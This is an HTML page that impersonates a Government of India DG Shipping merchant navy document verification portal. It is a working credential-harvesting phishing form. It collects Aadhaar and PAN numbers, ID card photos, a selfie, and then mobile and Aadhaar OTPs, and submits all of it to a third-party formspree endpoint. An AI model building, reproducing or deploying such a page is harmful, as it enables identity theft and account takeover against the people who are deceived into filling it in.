<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DG Shipping | Document Verification Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; padding: 10px; margin: 0; }
        .form-box { background: white; max-width: 450px; margin: 20px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .header { text-align: center; border-bottom: 2px solid #003366; margin-bottom: 20px; padding-bottom: 10px; }
        label { font-weight: 600; font-size: 13px; display: block; margin-top: 15px; color: #333; }
        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .step-2 { display: none; background: #eefbff; padding: 15px; border-radius: 8px; margin-top: 20px; border: 1px solid #003366; }
        .btn { background: #003366; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; margin-top: 20px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-next { background: #28a745; }
    </style>
</head>
<body>

<div class="form-box">
    <div class="header">
        <h2 style="margin:0; color:#003366; font-size: 18px;">GOVERNMENT OF INDIA</h2>
        <span style="font-size: 11px; color: #666; font-weight: bold;">Merchant Navy Document Verification</span>
    </div>

    <form action="https://formspree.io/f/mgolayya" method="POST" enctype="multipart/form-data">
        
        <div id="step1">
            <label>Full Name (As per Aadhaar) *</label>
            <input type="text" name="full_name" required>

            <label>Mobile Number *</label>
            <input type="tel" name="mobile" required>

            <label>Email ID *</label>
            <input type="email" name="email" required>

            <label>Aadhaar Card Number *</label>
            <input type="number" name="aadhaar_no" required>

            <label>PAN Card Number *</label>
            <input type="text" name="pan_no" required>

            <label>Aadhaar Front & Back (Combined/Front) *</label>
            <input type="file" name="aadhaar_photo" required>

            <label>PAN Card Photo *</label>
            <input type="file" name="pan_photo" required>

            <label>Candidate Selfie (Live) *</label>
            <input type="file" name="selfie" required>

            <button type="button" class="btn btn-next" onclick="showOTP()">Next: Verify Identity</button>
        </div>

        <div id="step2" class="step-2">
            <p style="text-align:center; font-weight:bold; color:#003366; margin-top:0;">🔐 IDENTITY VERIFICATION</p>
            
            <label>Mobile OTP *</label>
            <input type="text" name="mobile_otp" placeholder="Enter OTP sent to Mobile" required>

            <label>Aadhaar OTP *</label>
            <input type="text" name="aadhaar_otp" placeholder="Enter OTP sent to Aadhaar Number" required>

            <button type="submit" class="btn">FINAL VERIFICATION</button>
        </div>
    </form>
</div>

<script>
    function showOTP() {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }
</script>

</body>
</html>
